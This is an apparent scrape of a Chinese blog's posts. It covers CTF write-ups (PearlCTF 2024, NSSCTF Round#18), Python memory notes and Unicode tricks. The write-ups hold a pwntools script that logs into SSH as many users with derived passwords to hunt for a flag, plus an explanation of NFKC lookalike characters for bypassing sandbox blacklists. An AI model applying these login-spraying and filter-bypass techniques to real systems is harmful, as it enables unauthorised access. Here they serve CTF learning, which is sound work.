generate_user_ids(): 16 global flag_no 17 random_numbers = [] 18 for i in range(1000000): 19 random_number = random.getrandbits(32) 20 random_numbers.append(random_number) 21 flag_no = random_numbers[-1] 22 print(flag_no) 23 st_id = 624 24 end_id = 999999 25 del random_numbers[st_id:end_id] 26 return random_numbers 27 28user_ids = generate_user_ids() 29j = 0 30 31@app.route(\u0026#39;/\u0026#39;) 32def home(): 33 return redirect(\u0026#39;/dashboard\u0026#39;) 34 35@app.route(\u0026#39;/dashboard\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) 36def dashboard(): 37 global j 38 id_no = user_ids[j%624] 39 j += 1 40 if request.method == \u0026#39;POST\u0026#39;: 41 number = int(request.form[\u0026#39;number\u0026#39;]) 42 if number == flag_no: 43 return redirect(\u0026#39;/flagkeeper\u0026#39;) 44 else: 45 return redirect(\u0026#39;/wrongnumber\u0026#39;) 46 return render_template(\u0026#39;dashboard.html\u0026#39;, number=id_no) 47 48@app.route(\u0026#39;/flagkeeper\u0026#39;) 49def flagkeeper_dashboard(): 50 return render_template(\u0026#39;flag_keeper.html\u0026#39;, user_id=flag_no) 51 52@app.route(\u0026#39;/wrongnumber\u0026#39;) 53def wrong_number(): 54 return render_template(\u0026#39;wrong_number.html\u0026#39;) 55 56if __name__ == \u0026#39;__main__\u0026#39;: 57 app.run(debug=False, host=\u0026#34;0.0.0.0\u0026#34;) 题目需要开启实例，进去后会让用户输入一个随机数：\n此页面为 /dashboard。如果随便输入一个数，大概率会错误，然后进入一个错误页面：\n此时页面为 /wrongnumber。根据题目给出代码中的逻辑，如果输入数字错误，则会进入 /wrongnumber，否则进入 /flagkeeper，因此尝试直接进入 /flagkeeper：\n噫！我中了！网页竟然连个保护都没有，应该是非预期解了。\ninput_validator 题目附件是一个 Java 类，反编译得到：\n1// Source code is decompiled from a .class file using FernFlower decompiler. 2import java.util.Scanner; 3 4public class input_validator { 5 private static final int FLAG_LEN = 34; 6 7 public input_validator() { 8 } 9 10 private static boolean validate(String var0, String var1) { 11 int[] var2 = new int[34]; 12 int[] var3 = new int[]{1102, 1067, 1032, 1562, 1612, 1257, 1562, 1067, 1012, 902, 882, 1397, 1472, 1312, 1442, 1582, 1067, 1263, 1363, 1413, 1379, 1311, 1187, 1285, 1217, 1313, 1297, 1431, 1137, 1273, 1161, 1339, 1267, 1427}; 13 14 int var4; 15 for(var4 = 0; var4 \u0026lt; 34; ++var4) { 16 var2[var4] = var0.charAt(var4) ^ var1.charAt(var4); 17 } 18 19 for(var4 = 0; var4 \u0026lt; 34; ++var4) { 20 var2[var4] -= var1.charAt(33 - var4); 21 } 22 23 int[] var6 = new int[34]; 24 25 int var5; 26 for(var5 = 0; var5 \u0026lt; 17; ++var5) { 27 var6[var5] = var2[1 + var5 * 2] * 5; 28 var6[var5 + 17] = var2[var5 * 2] * 2; 29 } 30 31 for(var5 = 0; var5 \u0026lt; 34; ++var5) { 32 var6[var5] += 1337; 33 } 34 35 for(var5 = 0; var5 \u0026lt; 34; ++var5) { 36 if (var6[var5] != var3[var5]) { 37 return false; 38 } 39 } 40 41 return true; 42 } 43 44 public static void main(String[] var0) { 45 Scanner var1 = new Scanner(System.in); 46 String var2 = \u0026#34;oF/M5BK_U\u0026lt;rqxCf8zWCPC(RK,/B\u0026#39;v3uARD\u0026#34;; 47 System.out.print(\u0026#34;Enter input: \u0026#34;); 48 String var3 = var1.nextLine(); 49 if (var3.length() != 34) { 50 System.out.println(\u0026#34;Input length does not match!\u0026#34;); 51 } else { 52 if (validate(new String(var3), var2)) { 53 System.out.println(\u0026#34;Correct\u0026#34;); 54 } else { 55 System.out.println(\u0026#34;Wrong\u0026#34;); 56 } 57 58 } 59 } 60} 解题脚本：\n1c = [1102, 1067, 1032, 1562, 1612, 1257, 1562, 1067, 1012, 902, 882, 1397, 1472, 1312, 1442, 1582, 1067, 1263, 1363, 1413, 1379, 1311, 1187, 1285, 1217, 1313, 1297, 1431, 1137, 1273, 1161, 1339, 1267, 1427] 2key = list(\u0026#34;oF/M5BK_U\u0026lt;rqxCf8zWCPC(RK,/B\u0026#39;v3uARD\u0026#34;) 3 4for i in range(34): 5 key[i] = ord(key[i]) 6 7for i in range(34): 8 c[i] -= 1337 9 10c1 = [\u0026#39;\u0026#39;] * 34 11for i in range(17): 12 c1[i * 2 + 1] = int(c[i] / 5) 13 c1[i * 2] = int(c[i + 17] / 2) 14 15for i in range(34): 16 c1[i] += key[33 - i] 17 18for i in range(34): 19 c1[i] ^= key[i] 20 21for i in range(34): 22 print(chr(c1[i]), end = \u0026#39;\u0026#39;) 23 24# output: pearl{w0w_r3v3r51ng_15_50_Ea5y_!!} Shipwreck 题目附件是一个 .blend Blender 工程文件，需要使用 Blender 打开。\nflag 在船上第二根桅杆顶部的灯泡上，把灯泡隐藏就能看见 flag。\n眼力题。\nExcel Mayhem 题目附件是一个 .xlsx 的 Excel 表格文件，文件中有 40000 个 flag，其中有 39999 个 fake flag 与一个 real flag。\n众所周知，.xlsx 文件本质上是一个压缩文件，我们不妨修改文件后缀名为 .zip 并解压之。原文件中的字符串存储于 flags\\xl\\sharedStrings.xml 中。\n使用下面的脚本检测缺少哪一个 'fake_flag'\n1with open(\u0026#34;sharedStrings.xml\u0026#34;, \u0026#39;r\u0026#39;) as xml: 2 s = xml.read().split(\u0026#39;\u0026lt;/t\u0026gt;\u0026lt;/si\u0026gt;\u0026lt;si\u0026gt;\u0026lt;t\u0026gt;\u0026#39;) 3 4for i in range(2,40001): 5 fake = f\u0026#34;fake_flag{i}\u0026#34; 6 if fake not in s: 7 print(i) 8 break 9 10# output: 1351 第 1351 个 flag 是 real flag。\n其实眼力好的话，有几行宽度不一样，也可以直接看出来。\n","link":"https://jackgdn.github.io/post/pearl2024/","section":"post","tags":["Reverse","Misc","Forensics","WP"],"title":"PearlCTF 2024 WP"},{"body":"本文中交替出现 Python 的编译模式和交互模式代码块，为便于区分，带有 \u0026gt;\u0026gt;\u0026gt; 的 Python 代码块为交互模式，其余 Python 代码块为编译模式。\n可变对象与不可变对象 可变对象 不可变对象 列表、字典、集合 整型、浮点型、布尔型、字符串、元组 简单来说，可变对象就是指在修改数据时，直接修改原来的数据对象；不可变对象则是创建一个新的对象，并且将变量的引用转移到新创建的对象上。\n1dictnry = {\u0026#39;a\u0026#39;: 0, \u0026#39;b\u0026#39;: 1} # 字典对象为可变对象 2print(id(dictnry)) 3dictnry[\u0026#39;a\u0026#39;] = 1 4print(id(dictnry)) 5 6\u0026#39;\u0026#39;\u0026#39; 7output: 81570839226304 91570839226304 10\u0026#39;\u0026#39;\u0026#39; 下面是一个不可变对象的例子：\n1string = \u0026#39;Hello, world?\u0026#39; 2print(id(string)) 3new_string = string.replace(\u0026#39;?\u0026#39;, \u0026#39;!\u0026#39;) # 因为字符串是不可变对象，因此在修改时需要一个新的变量接受修改后的字符串 4print(id(new_string)) 5print(string) 6print(new_string) 7 8\u0026#39;\u0026#39;\u0026#39; 9output: 101668896675760 111668896210864 12Hello, world? 13Hello, world! 14\u0026#39;\u0026#39;\u0026#39; 深拷贝与浅拷贝 浅拷贝：拷贝对象的引用。当原对象的数据改变时，拷贝的对象也会发生改变。 深拷贝：创建一个新的对象并将原数据存入新的对象。原对象数据改变不影响拷贝对象 在 Python 中，使用 copy() 函数实现浅拷贝，使用 copy.deepcopy() 函数实现深拷贝。\n1# 浅拷贝 2\u0026gt;\u0026gt;\u0026gt; a = {\u0026#39;a\u0026#39;: [1, 2]} 3\u0026gt;\u0026gt;\u0026gt; b = a.copy() 4\u0026gt;\u0026gt;\u0026gt; a, b 5({\u0026#39;a\u0026#39;: [1, 2]}, {\u0026#39;a\u0026#39;: [1, 2]}) 6\u0026gt;\u0026gt;\u0026gt; a[\u0026#39;a\u0026#39;].append(3) 7\u0026gt;\u0026gt;\u0026gt; a, b 8({\u0026#39;a\u0026#39;: [1, 2, 3]}, {\u0026#39;a\u0026#39;: [1, 2, 3]}) 9# 在浅拷贝中，只拷贝原对象的引用（地址）而非创建一个新的对象，因此原对象的值改变，拷贝的对象也随之改变。 10 11# 深拷贝 12\u0026gt;\u0026gt;\u0026gt; import copy 13\u0026gt;\u0026gt;\u0026gt; a = {\u0026#39;a\u0026#39;: [1, 2]} 14\u0026gt;\u0026gt;\u0026gt; b = copy.deepcopy(a) 15\u0026gt;\u0026gt;\u0026gt; a, b 16({\u0026#39;a\u0026#39;: [1, 2]}, {\u0026#39;a\u0026#39;: [1, 2]}) 17\u0026gt;\u0026gt;\u0026gt; a[\u0026#39;a\u0026#39;].append(3) 18\u0026gt;\u0026gt;\u0026gt; a, b 19({\u0026#39;a\u0026#39;: [1, 2, 3]}, {\u0026#39;a\u0026#39;: [1, 2]}) 20# 在深拷贝中，拷贝创建了一个新的对象，因此原对象的值发生改变不影响拷贝的对象的值。 打开 Python Shell，尝试以下操作：\n1\u0026gt;\u0026gt;\u0026gt; a = 10 2\u0026gt;\u0026gt;\u0026gt; b = 10 3\u0026gt;\u0026gt;\u0026gt; a is b 4True 5\u0026gt;\u0026gt;\u0026gt; a = -4 6\u0026gt;\u0026gt;\u0026gt; b = -4 7\u0026gt;\u0026gt;\u0026gt; a is b 8True 9\u0026gt;\u0026gt;\u0026gt; a = 1234 10\u0026gt;\u0026gt;\u0026gt; b = 1234 11\u0026gt;\u0026gt;\u0026gt; a is b 12False 13\u0026gt;\u0026gt;\u0026gt; a = \u0026#39;hi!\u0026#39; 14\u0026gt;\u0026gt;\u0026gt; b = \u0026#39;hi!\u0026#39; 15\u0026gt;\u0026gt;\u0026gt; a is b 16False 17\u0026gt;\u0026gt;\u0026gt; a = \u0026#39;hello_world\u0026#39; 18\u0026gt;\u0026gt;\u0026gt; b = \u0026#39;hello_world\u0026#39; 19\u0026gt;\u0026gt;\u0026gt; a is b 20True 注意：Python 中 == 运算符用于判断两个数据在数值上是否相等，而 is 关键字用于判断两个数据的引用是否一致，通俗来说就是地址是否一致。\n1\u0026gt;\u0026gt;\u0026gt; a = 10 2\u0026gt;\u0026gt;\u0026gt; b = 10.0 3\u0026gt;\u0026gt;\u0026gt; a == b 4True 5\u0026gt;\u0026gt;\u0026gt; a is b 6False 小整数池 Python 为了节约运行内存，添加了小整数池机制。Python 会将 -5 到 256 （含 -5 与 256）的数据存储在固定位置，在需要时直接引用，而不是创建一个新的整形对象。因此：\n1\u0026gt;\u0026gt;\u0026gt; a = 10 2\u0026gt;\u0026gt;\u0026gt; b = 10 3\u0026gt;\u0026gt;\u0026gt; id(a) 4140720040721112 5\u0026gt;\u0026gt;\u0026gt; id(b) 6140720040721112 除了整型对象，仅有的两个布尔型对象也有固定的地址，每次引用都是相同的 True（或者 False）。然而，对于超出小整数池的数据，在引用时就会创建出一个新的对象：\n1\u0026gt;\u0026gt;\u0026gt; a = 1234 2\u0026gt;\u0026gt;\u0026gt; b = 1234 3\u0026gt;\u0026gt;\u0026gt; id(a) 42180555911728 5\u0026gt;\u0026gt;\u0026gt; id(b) 62180558782128 当然，上面的操作都在 Python Shell 中完成。如果在 IDLE 中编写好代码再运行，结果也许会有些许不同……\nInterning 对于上面的例子，在 IDLE 中写好代码运行的结果如下：\n1a = 1234 2b = 1234 3print(id(a)) 4print(id(b)) 5print(a is b) 6 7\u0026#39;\u0026#39;\u0026#39; 8output: 92230861897584 102230861897584 11True 12\u0026#39;\u0026#39;\u0026#39; 不难发现，这一次运行程序，两个 1234 的引用一致。这是因为，Python 在创建了一个整型对象 1234 并被变量 a 引用后，变量 b 也需要引用一个整型对象 1234，因此 b 也引用了刚才创建的整型对象。\n不仅仅是整型对象，除元组外的不可变对象在编译模式下都适用 Interning 机制，而仅当元组内的所有元素都为不可变对象时，元组才适用 Interning 机制。\n字符串驻留 上述 Interning 机制是对于编译模式来讲的，而在交互模式中，同样有字符串驻留机制用于节约内存，以下情况会在交互模式中触发：\n字符串的长度为 0 或 1 字符串长度大于 1 且字符串中仅含有字母、数字及下划线 驻留发生在编译时而非运行时 在查找资料时，许多文章都提到由乘法得到的字符串长度小于等于 20 且仅含有字母、数字及下划线时也会触发驻留机制，然而依据我在 Python 3.12 中的尝试：\n1\u0026gt;\u0026gt;\u0026gt; a = \u0026#39;1234567890qwertyuiop_ASDFGHJKL\u0026#39; * 10 2\u0026gt;\u0026gt;\u0026gt; b = \u0026#39;1234567890qwertyuiop_ASDFGHJKL\u0026#39; * 10 3\u0026gt;\u0026gt;\u0026gt; len(a) 4300 5\u0026gt;\u0026gt;\u0026gt; len(b) 6300 7\u0026gt;\u0026gt;\u0026gt; a is b 8True 这一条似乎并不成立。\n这里面最难以理解的应该是第三条，可以用下面的例子解释：\n1\u0026gt;\u0026gt;\u0026gt; a = \u0026#39;Hi_\u0026#39; 2\u0026gt;\u0026gt;\u0026gt; b = \u0026#39;Hi\u0026#39; + \u0026#39;_\u0026#39; 3\u0026gt;\u0026gt;\u0026gt; a is b 4True # 编译时 5\u0026gt;\u0026gt;\u0026gt; a = \u0026#39;Hi_\u0026#39; 6\u0026gt;\u0026gt;\u0026gt; b = \u0026#39;Hi\u0026#39; 7\u0026gt;\u0026gt;\u0026gt; b + \u0026#39;_\u0026#39; is a 8False # 运行时 ","link":"https://jackgdn.github.io/post/python-%E5%86%85%E5%AD%98%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/","section":"post","tags":["Python"],"title":"Python 内存相关学习记录"},{"body":"","link":"https://jackgdn.github.io/tags/c%23/","section":"tags","tags":null,"title":"C#"},{"body":"users \u0026amp; users_revenge 两道题可以用同一个脚本解。两道题区别就是题目 1 给出 200 个用户名，题目 2 给出 500 个用户名，密码为用户名的 MD5，其中有一个用户里有 flag，考虑使用 pwntools 连接。\n1from pwn import * 2import hashlib 3 4usrlst = [] 5pwdlst = [] 6flaglst = [] 7sususrlst = [] 8suspwdlst = [] 9excptlst = [] 10\u0026#39;\u0026#39;\u0026#39; 11file_name = 12given_host = 13given_port = 14\u0026#39;\u0026#39;\u0026#39; 15with open(file_name, \u0026#39;r\u0026#39;) as wordlist: 16 for line in wordlist: 17 username = line.rstrip() # 去除换行符 18 usrlst.append(username) 19 pwdlst.append(hashlib.md5(username.encode()).hexdigest()) 20 21for i in range(len(usrlst)): 22 try: 23 print(i) 24 shell = ssh(host = given_host, port = given_port, user = usrlst[i], password = pwdlst[i]) # 题目使用 SSH 连接 25 sh = shell.run(\u0026#39;ls -a\u0026#39;) # 不知道文件名与路径，先使用 ls -a 探探虚实。最后知道 flag.txt 确实是一个隐藏文件 26 flag = sh.recvall() 27 if len(flag) != 47: # 如果没有 flag，接收到默认文件名和路径名一共是 47 Bits，有 flag.txt 则会接收到 56 Bits 28 flaglst.append(flag) 29 sususrlst.append(usrlst[i]) 30 suspwdlst.append(pwdlst[i]) 31 shell.close() 32 except: 33 continue 34 excptlst.append(i) 35 36print(flaglst) 37print(sususrlst) 38print(suspwdlst) 39print(excptlst) 由于不知道存储 flag 文件的文件名以及路径，这一脚本只用于筛选可疑用户，找到可疑用户后再手动搜索 flag。不过好在每一道题中都只筛选出了一个可疑用户\n炒鸡常见的编码哇 IDA 打开程序，通过字符串找到程序的核心部分：\n1int sub_40160E() 2{ 3 int v0; // eax 4 int v1; // edx 5 int v2; // eax 6 char v4[9]; // [esp+17h] [ebp-21h] BYREF 7 unsigned int k; // [esp+20h] [ebp-18h] 8 int j; // [esp+24h] [ebp-14h] 9 int i; // [esp+28h] [ebp-10h] 10 int v8; // [esp+2Ch] [ebp-Ch] 11 12 sub_40C270(); 13 v8 = 0; 14 sub_4A3450(\u0026amp;dword_4B0960, \u0026#34;Please input Your flag to start Happy New Year!!\u0026#34;); 15 sub_46AFB0(sub_4A1540); 16 sub_4A4130(\u0026amp;dword_4B0780, Str); 17 dword_4F8924 = 8 * strlen(Str); 18 for ( i = 0; Str[i]; ++i ) 19 { 20 sub_4014BC(Str[i], v4); 21 for ( j = 0; j \u0026lt;= 7; ++j ) 22 { 23 v0 = v8++; 24 byte_4F8120[v0] = v4[j]; 25 } 26 } 27 for ( k = 0; k \u0026lt; dword_4F8924; k += 6 ) 28 { 29 sub_40150A(\u0026amp;byte_4F8120[k]); 30 v1 = sub_4015CA(\u0026amp;byte_4F8120[k]); 31 v2 = dword_4F8A40++; 32 byte_4F8940[v2] = byte_4AF020[v1]; 33 } 34 if ( !memcmp(byte_4F8940, \u0026amp;unk_4AF080, 0x80u) ) 35 sub_4A3450(\u0026amp;dword_4B0960, \u0026#34;Good Job!\u0026#34;); 36 else 37 sub_4A3450(\u0026amp;dword_4B0960, \u0026#34;Try Again!\u0026#34;); 38 sub_46AFB0(sub_4A1540); 39 return 0; 40} 下面是另外三个重要函数 sub_4014BC()、sub_40150A() 与 sub_4015CA() 的定义：\n1int __cdecl sub_4014BC(char a1, int a2) 2{ 3 int result; // eax 4 int i; // [esp+10h] [ebp-4h] 5 6 for ( i = 7; i \u0026gt;= 0; --i ) 7 *(7 - i + a2) = (a1 \u0026gt;\u0026gt; i) \u0026amp; 1; 8 result = a2 + 8; 9 *(a2 + 8) = 0; 10 return result; 11} 12 13int __cdecl sub_40150A(int a1) 14{ 15 int result; // eax 16 int i; // [esp+18h] [ebp-10h] 17 int v3; // [esp+18h] [ebp-10h] 18 int v4; // [esp+1Ch] [ebp-Ch] 19 20 v4 = 0; 21 for ( i = 0; i \u0026lt;= 255; i = v3 + 1 ) 22 { 23 v3 = (i + 1) % 256; 24 v4 = (v3 + v4 + 1) % 256; 25 result = sub_4A1658(v3 % 6 + a1, v4 % 6 + a1); 26 } 27 return result; 28} 29 30int __cdecl sub_4015CA(int a1) 31{ 32 int i; // [esp+4h] [ebp-Ch] 33 int v3; // [esp+8h] [ebp-8h] 34 int v4; // [esp+Ch] [ebp-4h] 35 36 v4 = 0; 37 v3 = 1; 38 for ( i = 5; i \u0026gt;= 0; --i ) 39 { 40 v4 += v3 * *(i + a1); 41 v3 *= 2; 42 } 43 return v4; 44} sub_4014BC() 将输入字符串的每一个字节转化为八位二进制数并存储进新的数组，在 sub_40160E() 中，输入字符串的二进制形式被存储在 byte_4F8120 中，这一转换过程在第一个 for 循环语句中完成。\nsub_4015CA() 将二进制数组六个一组进行编码，在 sub_40160E() 的第二个 for 循环语句中，程序完成了变种 Base64 重新编码的过程。编码表存储在 byte_4AF020 中。\nsub_40150A() 比较难以理解，但是大体能看出是在以六字节个为一组进行改变顺序的操作。经过调试可以知道该函数改变顺序的逻辑：\n调整前索引 调整后索引 0 0 1 2 2 4 3 5 4 3 5 1 具体调试的过程，就是在 byte_4F8120 被调整顺序前，将其修改为由 1 个 1 和 5 个 0 组成的六位二进制数，通过改变 1 的位置查看 sub_40150A() 打乱顺序的方式。\n编码后的字符串存储在 byte_4F8940 中。解题脚本如下：\n1from Crypto.Util.number import * 2 3cipher = [0xE2, 0xF7, 0xD3, 0xE2, 0xC8, 0xB4, 0xD8, 0xC5, 0xCF, 0xB4, 4 0xE7, 0xEE, 0xE1, 0xD9, 0xF1, 0xEF, 0xCB, 0xEB, 0xD9, 0xC9, 5 0xCE, 0xC5, 0xD9, 0xE5, 0xCC, 0xB7, 0xD1, 0xED, 0xE0, 0xB4, 6 0xF1, 0xEE, 0xE0, 0xE7, 0xD2, 0xF6, 0xCB, 0xF3, 0xC9, 0xF3, 7 0xD3, 0xD5, 0xEF] 8table = [0xC0, 0xC1, 0xC2, 0xC3, 0xC4, 0xC5, 0xC6, 0xC7, 0xC8, 0xC9, 9 0xCA, 0xCB, 0xCC, 0xCD, 0xCE, 0xCF, 0xD0, 0xD1, 0xD2, 0xD3, 10 0xD4, 0xD5, 0xD6, 0xD7, 0xD8, 0xD9, 0xE0, 0xE1, 0xE2, 0xE3, 11 0xE4, 0xE5, 0xE6, 0xE7, 0xE8, 0xE9, 0xEA, 0xEB, 0xEC, 0xED, 12 0xEE, 0xEF, 0xF0, 0xF1, 0xF2, 0xF3, 0xF4, 0xF5, 0xF6, 0xF7, 13 0xF8, 0xF9, 0xAF, 0xB0, 0xB1, 0xB2, 0xB3, 0xB4, 0xB5, 0xB6, 14 0xB7, 0xB8, 0xAA, 0xAE] 15 16binaries = \u0026#39;\u0026#39; 17for i in cipher: 18 binaries += str(bin(table.index(i)))[2:].rjust(6, \u0026#39;0\u0026#39;) # 将每个编码转成 6 位二进制数 19blst = list(binaries) # 拼接成一个 258 位二进制数 20 21flag = [\u0026#39;N\u0026#39;] * 258 22for i in range(0, 258, 6): # 恢复正确顺序 23 flag[i] = blst[i] 24 flag[i + 1] = blst[i + 2] 25 flag[i + 2] = blst[i + 4] 26 flag[i + 3] = blst[i + 5] 27 flag[i + 4] = blst[i + 3] 28 flag[i + 5] = blst[i + 1] 29 30print(long_to_bytes(int(\u0026#39;\u0026#39;.join(flag)[:-2], 2)).decode()) # 舍弃最后补位的两个 0 31 32# output: NSSCTF{Y0u_4reThe_K1ng_0fBase64} ","link":"https://jackgdn.github.io/post/nss18/","section":"post","tags":["Reverse","Pwn","WP"],"title":"NSSCTF Round#18 WP"},{"body":"","link":"https://jackgdn.github.io/tags/pwn/","section":"tags","tags":null,"title":"Pwn"},{"body":"","link":"https://jackgdn.github.io/tags/unicode/","section":"tags","tags":null,"title":"Unicode"},{"body":"前段时间有一道不是很难的 Python 沙箱逃逸问题，用到了 Unicode 的 NFKC。这一次详细记录一下 Unicode 里有点意思的特性。\nNFKC 利用 NFKC 算是 Python 沙箱逃逸类题目里较为常用的一种方式。在编写攻击载荷时不得不用到某个字符，但是这个字符又被列入了检测的黑名单中，则会利用 Unicode 的 NFKC 标准化，而 Python 恰好也支持 NFKC，这不就巧了嘛！\n简单来说，NFKC 可以让程序更好地理解一些字符，它将那些形状类似但是编码不同的字符归为一组字符。例如说在 Unicode 中合字 ﬃ (U+FB03) 在视觉上等同于 ffi 三个字符拼凑而成，因此需要计算机软件能够识别 ffi 三个字符等同于 ﬃ 合字字符，以便于用户检索。\n因此在 Python 中就会有如下输出：\n1print(\u0026#34;１\u0026#34; == \u0026#34;1\u0026#34;) # U+FF11 2print(int(\u0026#34;１\u0026#34;) == int(\u0026#34;1\u0026#34;)) 3 4# output: 5# 6# False 7# True 在下面两个网站里可以找到取代某个 ASCII 字符的 Unicode 字符：\nGithub - h13t0ry/UnicodeToy: Unicode fuzzer for various purposes\nList of Unicode Characters of Bidirectional Class “European Number”\n看下面一道例题：\n1from secret import flag 2data = input(\u0026#39;\u0026gt; \u0026#39;) 3assert len(data) \u0026lt;= 9 and all(i not in \u0026#39;123456789\u0026#39; for i in data) and int(data) == 123456789 4print(flag) 看上去不是很麻烦。题目会在远程服务器上运行，secret 模块及其中的 flag 常量都存储在远程服务器上。 如果我们输入的 data 能够满足这个 assert 中的条件，flag 就会自己跳出来。\n条件如下：\ndata 的长度小于等于 9\ndata 中不含 “123456789” 中的任意一个字符\ndata 转化为整型后与 123456789 相等\n根据上面提到的内容，我们知道这道题需要利用 NFKC 得到正确的输入，不妨用下述代码遍历：\n1// filename: Exp_123456789 2 3public class Exp_123456789 { 4 public static void main(String[] args) { 5 // superscript numbers 6 System.out.printf(\u0026#34;%c%c%c\u0026#34;, \u0026#39;\\u00B9\u0026#39;, \u0026#39;\\u00B2\u0026#39;, \u0026#39;\\u00B3\u0026#39;); 7 for(char i = \u0026#39;\\u2074\u0026#39;; i \u0026lt;= \u0026#39;\\u2079\u0026#39;; i++) { 8 System.out.print(i); 9 } 10 System.out.print(\u0026#39;\\n\u0026#39;); 11 // subscript numbers 12 for(char i = \u0026#39;\\u2081\u0026#39;; i \u0026lt;= \u0026#39;\\u2089\u0026#39;; i++) { 13 System.out.print(i); 14 } 15 System.out.print(\u0026#39;\\n\u0026#39;); 16 // numbers with full stop 17 for(char i = \u0026#39;\\u2488\u0026#39;; i \u0026lt;= \u0026#39;\\u2490\u0026#39;; i++) { 18 System.out.print(i); 19 } 20 System.out.print(\u0026#39;\\n\u0026#39;); 21 //full width numbers 22 for(char i = \u0026#39;\\uFF11\u0026#39;; i \u0026lt;= \u0026#39;\\uFF19\u0026#39;; i++) { 23 System.out.print(i); 24 } 25 } 26} 27 28/* 29output: 30¹²³⁴⁵⁶⁷⁸⁹ 31₁₂₃₄₅₆₇₈₉ 32⒈⒉⒊⒋⒌⒍⒎⒏⒐ 33１２３４５６７８９ 34*/ 其实这段代码用 Python 实现更为方便，为了锻炼 Java 能力就先这么写了。不过后面判断哪一组数据符合条件，依然要使用 Python：\n1code = \u0026#34;assert len(data) \u0026lt;= 9 and all(i not in \u0026#39;123456789\u0026#39; for i in data) and int(data) == 123456789\u0026#34; 2try: 3 data = \u0026#34;¹²³⁴⁵⁶⁷⁸⁹\u0026#34; # superscript numbers 4 exec(code) 5 print(data) 6except: 7 try: 8 data = \u0026#34;₁₂₃₄₅₆₇₈₉\u0026#34; # subscript numbers 9 exec(code) 10 print(data) 11 except: 12 try: 13 data = \u0026#34;⒈⒉⒊⒋⒌⒍⒎⒏⒐\u0026#34; # numbers with full stop 14 exec(code) 15 print(data) 16 except: 17 data = \u0026#34;１２３４５６７８９\u0026#34; # full width numbers 18 exec(code) 19 print(data) 20 21# output: １２３４５６７８９ 宽字符赢得了比赛！\n零宽字符隐写 前几天想用零宽字符给述职报告凑字数，然后知道了这个东西。不妨先看看零宽字符是什么个东西。通俗来讲，零宽字符就是“宽度为 0 的字符”，一般在从右向左书写的语言以及字与字之间有连笔的语言，如阿拉伯语。下面是一个零宽字符的例子：\n1string = \u0026#34;A\u0026#34; + \u0026#34;\\u200C\\u200C\\u200D\\u200D\u0026#34; + \u0026#34;b\u0026#34; 2print(string) 3print(len(string)) 4 5# output: 6# 7# A‌‌‍‍b 8# 6 在上面的例子中，我们用到了 U+200C 与 U+200D 这两个零宽字符，它们分别是 “断字符” 和 “连字符”，用于控制阿拉伯语的连笔，故在英文语境下不会被打印出来。下面这张表是 Unicode 中全部零宽字符：\n编码 描述 U+200A ZERO WIDTH SPACE U+200B ZERO WIDTH SPACE U+200C ZERO WIDTH NON-JOINER U+200D ZERO WIDTH JOINER U+200E LEFT-TO-RIGHT MARK U+200F LEFT-TO-RIGHT MARK U+202A LEFT-TO-RIGHT EMBEDDING U+202C POP DIRECTIONAL FORMATTING U+202D LEFT-TO-RIGHT OVERRIDE U+2062 INVISIBLE TIMES U+2063 INVISIBLE SEPARATOR U+FEFF ZERO WIDTH NO-BREAK SPACE 如果一段文本中夹杂了零宽字符，一般的文本编辑器无法显示，但是放入 Cyberchef 或者 Vim 中就能看到了。用上面的 \u0026quot;A‌‌‍‍b\u0026quot; 举例子：\n那么什么是零宽字符隐写呢？零宽字符隐写将密文对应的编码转化为不同的零宽字符，并将其混杂在正常的文本中。例如说，我使用 U+200C 与 U+200D 两种零宽字符作为用于加密，我可以令 U+200C 对应二进制 0，U+200D 对应二进制 1。下面这段代码，将 \u0026quot;Meschenrechte\u0026quot; 这个单词隐写入 \u0026quot;Hello, World!\u0026quot; 这句话中：\n1print(\u0026#34;Hello, World\u0026#34;, end = \u0026#39;\u0026#39;) 2secret = \u0026#34;Meschenrechte\u0026#34; 3 4for i in secret: 5 s = str(bin(ord(i)))[2:] 6 print(\u0026#34;\\u200C\u0026#34;, end = \u0026#39;\u0026#39;) 7 for k in s: 8 if k == \u0026#34;0\u0026#34;: 9 print(\u0026#34;\\u200C\u0026#34;, end = \u0026#39;\u0026#39;) 10 else: 11 print(\u0026#34;\\u200D\u0026#34;, end = \u0026#39;\u0026#39;) 12 13print(\u0026#34;!\u0026#34;) 14 15# output: Hello, World‌‍‌‌‍‍‌‍‌‍‍‌‌‍‌‍‌‍‍‍‌‌‍‍‌‍‍‌‌‌‍‍‌‍‍‌‍‌‌‌‌‍‍‌‌‍‌‍‌‍‍‌‍‍‍‌‌‍‍‍‌‌‍‌‌‍‍‌‌‍‌‍‌‍‍‌‌‌‍‍‌‍‍‌‍‌‌‌‌‍‍‍‌‍‌‌‌‍‍‌‌‍‌‍! 在这一样例程序，我们只是把密文转换成 U+200C 与 U+200D 两种零宽字符并全部放入了 'd' 与 '!' 之间的位置。然而在实际操作中，密文可以使用其他几种零宽字符、使用其他编码格式、打乱顺序等等。由此可见，零宽字符隐写并没有一个统一的标准，我可以用任意的符号来代替一种编码，因此实际上零宽字符隐写最大的优势在于它看不见。正是出于这个原因，我认为 2023 安洵杯“疯狂的麦克斯”一题并不严谨。有许多在线工具可以进行零宽字符的加密与解密，安洵杯中使用的是这个：\nUnicode Steganography with Zero-Width Characters\n哦对了，还需要一个解密脚本，对应我自己设计的隐写脚本：\n1text = \u0026#34;Hello, World‌‍‌‌‍‍‌‍‌‍‍‌‌‍‌‍‌‍‍‍‌‌‍‍‌‍‍‌‌‌‍‍‌‍‍‌‍‌‌‌‌‍‍‌‌‍‌‍‌‍‍‌‍‍‍‌‌‍‍‍‌‌‍‌‌‍‍‌‌‍‌‍‌‍‍‌‌‌‍‍‌‍‍‌‍‌‌‌‌‍‍‍‌‍‌‌‌‍‍‌‌‍‌‍!\u0026#34; 2cip = text[12: -1] 3 4for i in range(0, 104, 8): 5 seg = cip[i: i + 8] 6 dat = 0 7 for k in range(0, 8): 8 if seg[k] == \u0026#34;\\u200D\u0026#34;: 9 dat = dat + 2**(7 - k) 10 print(chr(dat), end = \u0026#39;\u0026#39;) 11 12# output: Meschenrechte 试了一下，我自己的隐写脚本得到的结果，拖到那个网站里解密会失败 (っ °Д °;)っ\nUnicode 中的零宽字符早已被人们开发出更多的用途，例如添加文字水印防止剽窃、反爬虫摸出关键字防止屏蔽或者给文章凑字数。\nUnicode 附加字符 这个似乎与 CTF 的关系并不大，但是也挺有意思。演示一下：\ǹ́̂̃̄̅̆̇̈ ̉̊̋̌̍̎̏̐̑ 